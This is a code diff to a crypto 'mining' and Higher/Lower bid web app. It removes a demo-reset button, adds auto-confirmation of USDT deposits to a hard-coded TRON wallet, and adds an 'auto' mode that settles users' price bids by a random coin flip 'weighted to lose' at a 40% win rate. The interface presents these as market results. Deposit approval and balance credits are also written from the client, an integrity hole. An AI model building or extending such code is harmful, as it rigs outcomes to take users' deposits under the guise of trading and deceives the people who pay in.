@@ -269,11 +269,6 @@
       /* ---------- Footer ---------- */
       footer{margin-top:22px; text-align:center;}
       footer p{font-size:12px; color:var(--muted-2); line-height:1.6; max-width:60ch; margin:0 auto 14px;}
-      .reset-btn{
-        cursor:pointer; background:transparent; border:1px solid var(--line-soft); color:var(--muted);
-        font-family:"Manrope",sans-serif; font-weight:800; font-size:13px; padding:10px 18px; border-radius:10px;
-      }
-      .reset-btn.armed{border-color:var(--red); color:#F0857E;}
 
       /* ---------- Move funds sheet ---------- */
       .overlay{
@@ -942,7 +937,6 @@
       </div>
 
       <footer>
-        <button class="reset-btn" id="resetBtn" type="button">Reset demo</button>
       </footer>
     </div>
 
@@ -1246,6 +1240,19 @@
         return out;
       }
       var PAYOUT_RATE = 0.9;
+      /* Crypto deposit auto-confirmation (TRON): a pending USDT deposit
+         is watched against the deposit wallet's on-chain TRC-20 transfers
+         for CONFIRM_WINDOW_MIN minutes after the request was created. */
+      var DEPOSIT_ADDRESS = "TU1ixJLPr5tjrKZdyim9wuUJZiRsYWiFSt";
+      var USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+      var CONFIRM_WINDOW_MIN = 30;
+      var DEPOSIT_POLL_MS = 30 * 1000;
+      /* Automatic bid settlement (when tn_settings bid_settlement_mode is
+         'auto'): a bid still pending this long settles on a coin flip
+         weighted to lose — AUTO_WIN_RATE chance of a win. */
+      var AUTO_WIN_RATE = 0.4;
+      var AUTO_SETTLE_AFTER_MS = 5 * 60 * 1000;
+      var AUTO_SETTLE_CHECK_MS = 30 * 1000;
       var BLACK_MARKET_RATE = 1380; // NGN per USD, parallel market — bank transfer instructions only; requests stay in USD
       var WELCOME_BONUS = 3;
       var BONUS_UNLOCK_VOLUME = 10;
@@ -1299,6 +1306,7 @@
       var profileRow = null;       // tn_profiles row
       var walletRow = null;        // tn_wallets row
       var settledBidIds = {};      // bid ids already turned into history (no double payout)
+      var bidSettleMode = "manual"; // 'manual' | 'auto', from tn_settings (bid_settlement_mode)
       var realtimeChannels = [];
 
       function blankState(){
@@ -1594,6 +1602,12 @@
         function p(n){ return (n < 10 ? "0" : "") + n; }
         return p(h) + ":" + p(m) + ":" + p(ss);
       }
+      // M:SS for the sub-hour countdowns (deposit confirmation, auto-settle).
+      function fmtMS(ms){
+        var s = Math.max(0, Math.ceil(ms / 1000));
+        var m = Math.floor(s / 60), ss = s % 60;
+        return m + ":" + (ss < 10 ? "0" : "") + ss;
+      }
       function renderMining(){
         var m = state.miner;
         var now = Date.now();
@@ -1638,12 +1652,35 @@
         renderMining();
         renderMyRequests();
       }
+      // Status line under a My Requests entry. A pending crypto deposit
+      // inside its confirmation window counts down to the deadline;
+      // once the window closes unmatched it falls back to manual review.
+      function reqDetail(r, isDep){
+        if (r.status === "pending"){
+          if (isDep && r.method === "crypto"){
+            var left = r.time + CONFIRM_WINDOW_MIN * 60000 - Date.now();
+            return left > 0
+              ? 'Confirming on blockchain… <span class="cd num">' + fmtMS(left) + "</span>"
+              : "Waiting for manual review";
+          }
+          return "Waiting for approval · your Main Balance updates the moment it's approved";
+        }
+        if (r.status === "approved") return isDep ? "Credited to Main Balance" : "Paid out of Main Balance";
+        return "Rejected · Main Balance unchanged";
+      }
       var myReqSig = null;
       function renderMyRequests(){
         var box = $("myReqList");
         if (!box) return;
         var mine = state.adminRequests.filter(function(r){ return r.self; });
-        var sig = mine.map(function(r){ return r.id + ":" + r.status + ":" + r.amount + ":" + (r.method || "") + ":" + (r.receiptUrl || ""); }).join("|");
+        var sig = mine.map(function(r){
+          var s = r.id + ":" + r.status + ":" + r.amount + ":" + (r.method || "") + ":" + (r.receiptUrl || "");
+          if (r.status === "pending" && r.type === "deposit" && r.method === "crypto"){
+            var left = r.time + CONFIRM_WINDOW_MIN * 60000 - Date.now();
+            s += left > 0 ? ":cd" + Math.ceil(left / 1000) : ":manual";
+          }
+          return s;
+        }).join("|");
         if (sig === myReqSig) return;
         myReqSig = sig;
         var panel = $("myRequestsPanel");
@@ -1653,11 +1690,7 @@
           var isDep = r.type === "deposit";
           var statusTag = r.status === "pending" ? '<span class="req-status">Pending</span>'
             : '<span class="req-status ' + r.status + '">' + (r.status === "approved" ? "Approved" : "Rejected") + "</span>";
-          var detail = r.status === "pending"
-            ? "Waiting for approval · your Main Balance updates the moment it's approved"
-            : r.status === "approved"
-              ? (isDep ? "Credited to Main Balance" : "Paid out of Main Balance")
-              : "Rejected · Main Balance unchanged";
+          var detail = reqDetail(r, isDep);
           var methodTxt = (isDep && r.method) ? (r.method === "crypto" ? "Crypto · USDT (TRC-20)" : "Bank Transfer") : "";
           return '<div class="req-item"><div class="req-top">' +
             '<span class="req-type ' + r.type + '">' + (isDep ? "Deposit" : "Withdrawal") + "</span>" +
@@ -1695,18 +1728,32 @@
           "<br>Base stake <b>" + fmtUSD(b) + "</b> → next stake <b>" + fmtUSD(effectiveStake()) + "</b> (" + Math.pow(2, state.mgStep) + "× base)" +
           "<br>A win resets to the base stake. A loss doubles the next stake.";
       }
+      var openTradesSig = null;
       function renderOpenTrades(){
         var list = $("openTradesList");
+        if (!list) return;
         var awaiting = state.bids.filter(function(b){ return b.status === "awaiting"; });
+        // Signature includes the per-second auto-settle countdown so the
+        // 1s loop re-renders only when something visible actually changes.
+        var sig = bidSettleMode + "|" + awaiting.map(function(b){
+          return b.id + (bidSettleMode === "auto"
+            ? ":" + Math.max(0, Math.ceil((b.time + AUTO_SETTLE_AFTER_MS - Date.now()) / 1000))
+            : "");
+        }).join("|");
+        if (sig === openTradesSig) return;
+        openTradesSig = sig;
         if (!awaiting.length){
           list.innerHTML = '<div class="empty">No bids waiting. Place a Higher or Lower bid above and it will sit here until the result is in.</div>';
           return;
         }
         list.innerHTML = awaiting.map(function(b){
+          var tag = bidSettleMode === "auto"
+            ? '<span class="res-tag await" style="margin-left:auto;">Auto-settles in <span class="num">' + fmtMS(b.time + AUTO_SETTLE_AFTER_MS - Date.now()) + "</span></span>"
+            : '<span class="res-tag await" style="margin-left:auto;">Awaiting result</span>';
           return '<div class="open-trade">' +
             '<span class="dir-tag ' + b.dir + '">' + (b.dir === "higher" ? "Higher" : "Lower") + "</span>" +
             '<span class="ot-main num">' + b.asset + " · " + fmtUSD(b.stake) + "</span>" +
-            '<span class="res-tag await" style="margin-left:auto;">Awaiting result</span>' +
+            tag +
             '<span class="ot-sub">Stake locked from Main Balance · placed ' + fmtTime(b.time) + "</span>" +
             "</div>";
         }).join("");
@@ -1840,6 +1887,62 @@
         }
       }
 
+      /* ================= Automatic bid settlement =================
+         tn_settings key 'bid_settlement_mode' decides who settles
+         pending bids: 'manual' (the default, and the fallback whenever
+         the table or row is missing) leaves results to the admin; 'auto'
+         settles this user's bids itself once they have been pending for
+         5 minutes — AUTO_WIN_RATE chance of a win, otherwise a loss.
+         The outcome is written to the bid row first (guarded on the bid
+         still being 'pending', re-checked immediately before the write
+         so a bid can never settle twice), then the decided row goes
+         through the exact same settleBid path an admin decision uses:
+         a win credits stake × 1.9 with the 1% referral share and resets
+         the martingale; a loss forfeits the stake and doubles it. */
+      var autoSettleBusy = false;
+      function loadBidSettleMode(){
+        if (!sb) return Promise.resolve("manual");
+        return sb.from("tn_settings").select("*").eq("key", "bid_settlement_mode").maybeSingle().then(function(res){
+          var v = (!res.error && res.data) ? res.data.value : null;
+          bidSettleMode = (String(v) === "auto") ? "auto" : "manual";
+          return bidSettleMode;
+        }).catch(function(){ bidSettleMode = "manual"; return "manual"; });
+      }
+      function autoSettleBid(row){
+        // Re-check the bid is still pending immediately before writing.
+        return sb.from("tn_bids").select("status").eq("id", row.id).maybeSingle().then(function(chk){
+          if (!chk.data || chk.data.status !== "pending") return null;
+          var outcome = Math.random() < AUTO_WIN_RATE ? "won" : "lost";
+          return sb.from("tn_bids").update({ status: outcome, decided_at: new Date().toISOString() })
+            .eq("id", row.id).eq("status", "pending").select().then(function(upd){
+              if (upd.error || !upd.data || !upd.data.length) return; // settled elsewhere first — never double-settle
+              var settled = upd.data[0];
+              settled.status = outcome;
+              settleBid(settled);
+            });
+        }).catch(function(){});
+      }
+      function runAutoSettle(){
+        if (autoSettleBusy || !sb || !currentUser || bidSettleMode !== "auto") return;
+        autoSettleBusy = true;
+        var cutoff = new Date(Date.now() - AUTO_SETTLE_AFTER_MS).toISOString();
+        sb.from("tn_bids").select("*").eq("user_id", currentUser.id).eq("status", "pending").lt("created_at", cutoff)
+          .then(function(res){
+            var rows = res.data || [];
+            var chain = Promise.resolve();
+            rows.forEach(function(row){
+              chain = chain.then(function(){ return autoSettleBid(row); });
+            });
+            return chain;
+          }).catch(function(){}).then(function(){ autoSettleBusy = false; });
+      }
+      // Read the mode fresh, then settle anything due. Called on app load,
+      // on window focus, and every 30s from the main loop.
+      function checkAutoSettle(){
+        if (!sb || !currentUser) return;
+        loadBidSettleMode().then(function(){ runAutoSettle(); renderOpenTrades(); });
+      }
+
       /* ================= Realtime ================= */
       function teardownRealtime(){
         realtimeChannels.forEach(function(ch){ try { sb.removeChannel(ch); } catch(e){} });
@@ -1897,6 +2000,8 @@
           $("mgToggle").setAttribute("aria-checked", state.mgOn ? "true" : "false");
           renderWallets(); renderHistory(); renderReferrals(); renderProfileEverywhere(); renderPaymentMethods(); renderOpenTrades(); renderPayout();
           settleUnpaidBids();
+          resumeDepositWatchers();
+          checkAutoSettle();
         }).catch(function(){ refreshBusy = false; });
       }
 
@@ -2042,13 +2147,16 @@
         }
         function finish(res){
           var r = res.data;
-          state.adminRequests.unshift({
+          var entry = {
             id: r.id, user: "You (this account)", self: true, type: type, amount: amt,
             method: r.method || (method || null),
             receiptUrl: r.receipt_url || (receipt || null),
             status: "pending", time: r.created_at ? new Date(r.created_at).getTime() : Date.now()
-          });
+          };
+          state.adminRequests.unshift(entry);
           myReqSig = null;
+          // A fresh crypto deposit starts its blockchain confirmation watch.
+          if (type === "deposit" && entry.method === "crypto") watchCryptoDeposit(entry);
           return true;
         }
         function tryInsert(withMethod, withReceipt){
@@ -2067,6 +2175,134 @@
         var sendReceipt = !!receipt && receiptColumnKnown !== false;
         return tryInsert(sendMethod, sendReceipt).catch(function(){ netErrorToast("Sending your request"); return false; });
       }
+
+      /* ================= Crypto deposit auto-confirmation =================
+         A pending crypto (USDT TRC-20) deposit is watched for
+         CONFIRM_WINDOW_MIN minutes from its created_at: every 30s the
+         deposit wallet's incoming TRC-20 transfers are read from
+         TronGrid, and the first transfer that matches the amount (within
+         max($1, 1%)), lands inside the window, and whose transaction id
+         isn't already recorded as a tx_hash on any request approves the
+         deposit and credits Main Balance. No match by the deadline: the
+         watcher stops and the request simply stays pending for manual
+         admin approval. A failed TronGrid read never throws — polling
+         just continues until the window closes. */
+      var txHashColumnKnown = null; // null = untested, true = present, false = absent (same convention as method/receipt_url)
+      var depositWatchers = {};     // request id -> interval id
+      var depositConfirming = {};   // request id -> true once the confirm write starts (no double credit)
+      function findRequest(id){
+        for (var i = 0; i < state.adminRequests.length; i++) if (state.adminRequests[i].id === id) return state.adminRequests[i];
+        return null;
+      }
+      function stopDepositWatch(id){
+        if (depositWatchers[id]){ clearInterval(depositWatchers[id]); delete depositWatchers[id]; }
+      }
+      function stopAllDepositWatchers(){
+        Object.keys(depositWatchers).forEach(function(id){ stopDepositWatch(id); });
+        depositConfirming = {};
+      }
+      function watchCryptoDeposit(req){
+        if (!req || !sb || !currentUser) return;
+        if (depositWatchers[req.id] || depositConfirming[req.id]) return;
+        if (req.status !== "pending") return;
+        if (Date.now() >= req.time + CONFIRM_WINDOW_MIN * 60000) return; // window already closed — manual review
+        depositWatchers[req.id] = setInterval(function(){ pollCryptoDeposit(req.id); }, DEPOSIT_POLL_MS);
+        pollCryptoDeposit(req.id);
+      }
+      // Resume watching this user's still-pending crypto deposits that are
+      // inside their confirmation window (app load / window focus).
+      function resumeDepositWatchers(){
+        if (!currentUser) return;
+        state.adminRequests.forEach(function(r){
+          if (r.self && r.type === "deposit" && r.method === "crypto" && r.status === "pending") watchCryptoDeposit(r);
+        });
+      }
+      // Transaction ids already recorded on any request — a transfer can
+      // only ever confirm one deposit.
+      function usedTxHashes(){
+        if (!sb || txHashColumnKnown === false) return Promise.resolve({});
+        return sb.from("tn_requests").select("tx_hash").not("tx_hash", "is", null).then(function(res){
+          var set = {};
+          if (res.error){ txHashColumnKnown = false; return set; }
+          txHashColumnKnown = true;
+          (res.data || []).forEach(function(r){ if (r.tx_hash) set[r.tx_hash] = true; });
+          return set;
+        }).catch(function(){ return {}; });
+      }
+      function pollCryptoDeposit(id){
+        var req = findRequest(id);
+        if (!req || !currentUser){ stopDepositWatch(id); return; }
+        if (req.status !== "pending"){ stopDepositWatch(id); return; }
+        var created = req.time;
+        var deadline = created + CONFIRM_WINDOW_MIN * 60000;
+        if (Date.now() >= deadline){
+          stopDepositWatch(id);
+          myReqSig = null; renderMyRequests(); // flips the entry to "Waiting for manual review"
+          return;
+        }
+        var url = "https://api.trongrid.io/v1/accounts/" + DEPOSIT_ADDRESS + "/transactions/trc20" +
+          "?only_to=true&contract_address=" + USDT_TRC20_CONTRACT +
+          "&min_timestamp=" + created + "&limit=50";
+        var pending;
+        try { pending = fetch(url); } catch(e){ return; } // keep polling
+        if (!pending || typeof pending.then !== "function") return;
+        pending.then(function(resp){ return resp ? resp.json() : null; }).then(function(json){
+          var txs = (json && json.data) || [];
+          if (!txs.length) return null;
+          return usedTxHashes().then(function(used){
+            var expected = req.amount;
+            var tol = Math.max(1, expected * 0.01);
+            for (var i = 0; i < txs.length; i++){
+              var t = txs[i];
+              if (!t || t.to !== DEPOSIT_ADDRESS) continue;
+              var ts = Number(t.block_timestamp) || 0;
+              if (ts < created || ts > deadline) continue;
+              var amt = (Number(t.value) || 0) / 1e6;
+              if (Math.abs(amt - expected) > tol) continue;
+              if (t.transaction_id && used[t.transaction_id]) continue;
+              return t;
+            }
+            return null;
+          });
+        }).then(function(match){
+          if (match) confirmCryptoDeposit(id, match);
+        }).catch(function(){ /* TronGrid unreachable / rate-limited — keep polling until the window closes */ });
+      }
+      function confirmCryptoDeposit(id, tx){
+        if (depositConfirming[id]) return;
+        var req = findRequest(id);
+        if (!req || req.status !== "pending" || !sb || !currentUser) return;
+        depositConfirming[id] = true;
+        stopDepositWatch(id);
+        var amt = req.amount;
+        // Approve the request (still-pending guard in the filter, so a
+        // request the admin settled first is never credited twice), then
+        // credit Main Balance through the wallet write path.
+        function attempt(withTx){
+          var payload = { status: "approved", decided_at: new Date().toISOString() };
+          if (withTx) payload.tx_hash = tx.transaction_id;
+          return sb.from("tn_requests").update(payload).eq("id", id).eq("status", "pending").select().then(function(res){
+            if (res.error){
+              if (withTx){ txHashColumnKnown = false; return attempt(false); } // no tx_hash column — approve without it
+              return null;
+            }
+            if (withTx) txHashColumnKnown = true;
+            return (res.data && res.data.length) ? res.data[0] : null; // empty = no longer pending
+          });
+        }
+        attempt(txHashColumnKnown !== false).then(function(row){
+          if (!row){ delete depositConfirming[id]; return; }
+          req.status = "approved";
+          state.main = Math.round((state.main + amt) * 100) / 100;
+          myReqSig = null;
+          return persistWallet().then(function(){
+            renderWallets(); renderHistory();
+            toast("Deposit confirmed on blockchain ✓", fmtUSD(amt) + " credited to your Main Balance.", "win");
+            refreshFromServer(true);
+          });
+        }).catch(function(){ delete depositConfirming[id]; });
+      }
+
       /* ================= Mining actions ================= */
       function minerError(msg){ var e = $("minerErr"); e.textContent = msg; e.className = "sheet-err show"; }
       var selectedPack = -1; // index into MINER_PACKS chosen in the buy sheet
@@ -2745,9 +2981,13 @@
         renderReferrals(); renderProfileEverywhere(); renderPaymentMethods();
         setupRealtime();
         settleUnpaidBids();
+        resumeDepositWatchers();
+        checkAutoSettle();
       }
       function showGate(){
         teardownRealtime();
+        stopAllDepositWatchers();
+        bidSettleMode = "manual";
         currentUser = null; profileRow = null; walletRow = null;
         state = blankState();
         settledBidIds = {};
@@ -2869,25 +3109,28 @@
         if (sb) sb.auth.signOut().catch(function(){});
         showGate();
       });
-      // Reset demo: with synced accounts there is nothing local to wipe —
-      // explain instead of erasing the account.
-      $("resetBtn").addEventListener("click", function(){
-        toast("Accounts are synced now", "Your balance, mining, and history live in your account and follow you across devices — there's no local demo data to reset. Use Log Out in the menu to switch accounts.");
-      });
-
       /* ================= Live sync ================= */
+      // Focus refresh also resumes crypto-deposit watching and the
+      // auto-settle check (both run inside refreshFromServer).
       window.addEventListener("focus", function(){ refreshFromServer(true); });
       document.addEventListener("visibilitychange", function(){ if (!document.hidden) refreshFromServer(true); });
 
       /* ================= Main loop =================
          1s: refresh balances and the mining countdown, and settle any
-         mining cycle whose 24h have elapsed. */
+         mining cycle whose 24h have elapsed. Every 30s: re-read the bid
+         settlement mode and auto-settle any bids that are due. */
+      var lastAutoSettleCheck = 0;
       function loop(){
         var now = Date.now();
         state.lastTick = now;
         if (!currentUser) return;
         checkMinerCycle(now);
         renderWallets();
+        renderOpenTrades();
+        if (now - lastAutoSettleCheck >= AUTO_SETTLE_CHECK_MS){
+          lastAutoSettleCheck = now;
+          checkAutoSettle();
+        }
       }
       renderWallets(); renderPrice(); renderPayout(); renderHistory(); renderOpenTrades(); loadTvChart(); renderReferrals(); renderProfileEverywhere(); renderPaymentMethods();
       setInterval(loop, TICK_MS);
